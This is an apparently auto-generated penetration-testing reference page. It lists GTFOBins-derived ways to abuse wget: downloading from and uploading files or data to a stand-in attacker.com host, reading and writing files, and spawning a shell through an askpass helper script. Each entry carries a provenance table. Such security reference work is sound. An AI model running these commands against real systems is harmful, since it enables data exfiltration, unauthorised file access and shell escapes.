---
parsed_by: focuslocust
source: commands
type: generated
---
# wget Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## wget

Tool page: [wget](../../tools/linux/wget.md)

### download

```text
wget http://attacker.com/path/to/input-file -O /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wget` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
wget -i /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wget` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
wget -i /path/to/input-file -o /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wget` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wget` |
| Evidence | Function example preserved from source parser. |

### upload

```text
wget --post-file=/path/to/input-file http://attacker.com
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wget` |
| Evidence | Function example preserved from source parser. |

### upload

```text
wget --post-data=DATA http://attacker.com
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wget` |
| Evidence | Function example preserved from source parser. |
